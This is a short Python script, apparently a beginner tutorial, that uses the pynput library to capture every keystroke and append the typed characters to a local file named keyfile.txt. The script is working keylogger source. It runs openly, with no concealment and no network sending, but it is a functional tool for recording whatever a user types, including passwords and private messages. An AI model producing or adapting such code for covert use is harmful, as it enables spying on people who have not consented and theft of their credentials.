from pynput import keyboard  # Import the pynput library

def keyPressed(key):
  """Function to handle key presses"""
  print(str(key))  # Print the pressed key object
  with open("keyfile.txt", 'a') as logKey:  # Open keyfile.txt in append mode
    try:
      char = key.char  # Get the character from the key if possible
      logKey.write(char)  # Write the character to the file
    except:
      print("ERROR GETTING CHAR")  # Print an error message if getting char fails

if __name__ == "__main__":
  listener = keyboard.Listener(on_press=keyPressed)  # Create a listener for key presses
  listener.start()  # Start listening for key presses
  input()  # Wait for user input to stop the program (press Enter)